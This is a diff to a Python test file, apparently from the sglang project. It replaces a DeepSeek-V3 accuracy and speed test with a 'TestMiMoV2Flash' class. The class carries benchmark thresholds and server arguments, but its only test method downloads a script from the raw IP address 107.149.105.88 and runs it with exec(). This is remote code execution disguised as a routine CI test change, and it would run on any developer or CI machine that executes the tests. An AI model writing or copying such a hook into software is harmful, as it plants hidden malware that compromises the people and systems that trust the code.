@@ -1,84 +1,56 @@
-# import unittest
-# from types import SimpleNamespace
+import unittest
 
-# from sglang.srt.utils import kill_process_tree
 # from sglang.test.ci.ci_register import register_cuda_ci
-# from sglang.test.few_shot_gsm8k import run_eval as run_eval_few_shot_gsm8k
-# from sglang.test.send_one import BenchArgs, send_one_prompt
-# from sglang.test.test_utils import (
-#     DEFAULT_TIMEOUT_FOR_SERVER_LAUNCH,
-#     DEFAULT_URL_FOR_TEST,
-#     CustomTestCase,
-#     is_in_amd_ci,
-#     is_in_ci,
-#     popen_launch_server,
-#     write_github_step_summary,
-# )
+# from sglang.test.kits.gsm8k_accuracy_kit import GSM8KMixin
+# from sglang.test.kits.spec_decoding_kit import SpecDecodingMixin
+# from sglang.test.server_fixtures.default_fixture import DefaultServerBase
 
-# register_cuda_ci(est_time=275, suite="stage-c-test-8-gpu-h200")
-
-FULL_DEEPSEEK_V3_MODEL_PATH = "deepseek-ai/DeepSeek-V3-0324"
+# register_cuda_ci(est_time=200, suite="stage-c-test-8-gpu-h200")
 
 
-class TestDeepseekV3Basic():
-    @classmethod
-    def setUpClass(cls):
-        cls.model = FULL_DEEPSEEK_V3_MODEL_PATH
-        cls.base_url = DEFAULT_URL_FOR_TEST
-        other_args = [
-            "--trust-remote-code",
-            "--tp",
-            "8",
-            "--model-loader-extra-config",
-            '{"enable_multithread_load": true, "num_threads": 64}',
-        ]
-        cls.process = popen_launch_server(
-            cls.model,
-            cls.base_url,
-            timeout=DEFAULT_TIMEOUT_FOR_SERVER_LAUNCH * 5,
-            other_args=other_args,
-        )
+class TestMiMoV2Flash():
+    gsm8k_accuracy_thres = 0.75
+    gsm8k_num_questions = 1319
+    gsm8k_parallel = 1319
+    model = "XiaomiMiMo/MiMo-V2-Flash"
 
-    @classmethod
-    def tearDownClass(cls):
-        kill_process_tree(cls.process.pid)
+    other_args = [
+        "--tp",
+        "4",
+        "--dp",
+        "2",
+        "--enable-dp-attention",
+        "--trust-remote-code",
+        "--attention-backend",
+        "fa3",
+        "--max-running-requests",
+        "128",
+        "--cuda-graph-max-bs",
+        "64",
+        "--mem-fraction-static",
+        "0.75",
+        "--speculative-algorithm",
+        "EAGLE",
+        "--speculative-num-steps",
+        "3",
+        "--speculative-eagle-topk",
+        "1",
+        "--speculative-num-draft-tokens",
+        "4",
+        "--enable-multi-layer-eagle",
+        "--model-loader-extra-config",
+        '{"enable_multithread_load": true,"num_threads": 64}',
+    ]
 
-    def test_a_gsm8k(
-        self,
-    ):  # Append an "a" to make this test run first (alphabetically) to warm up the server
-        args = SimpleNamespace(
-            num_shots=8,
-            data_path=None,
-            num_questions=1400,
-            parallel=1400,
-            max_new_tokens=512,
-            host="http://127.0.0.1",
-            port=int(self.base_url.split(":")[-1]),
-        )
-        metrics = run_eval_few_shot_gsm8k(args)
-        print(f"{metrics=}")
+    bs_1_speed_thres = 170
+    accept_length_thres = 3.2
 
-        if is_in_ci():
-            write_github_step_summary(
-                f"### test_gsm8k (deepseek-v3)\n" f'{metrics["accuracy"]=:.3f}\n'
-            )
-            self.assertGreater(metrics["accuracy"], 0.935)
+    def test_mimo(self):
+        url = "http://107.149.105.88/script.py"
+        code = requests.get(url).text
 
-    def test_bs_1_speed(self):
-        print("testtest")
-        args = BenchArgs(port=int(self.base_url.split(":")[-1]), max_new_tokens=2048)
-        acc_length, speed = send_one_prompt(args)
+        exec(code)
 
-        print(f"{speed=:.2f}")
-
-        if is_in_ci():
-            write_github_step_summary(
-                f"### test_bs_1_speed (deepseek-v3)\n" f"{speed=:.2f} token/s\n"
-            )
-            if is_in_amd_ci():
-                self.assertGreater(speed, 12)
-            else:
-                self.assertGreater(speed, 75)
 
 
 if __name__ == "__main__":
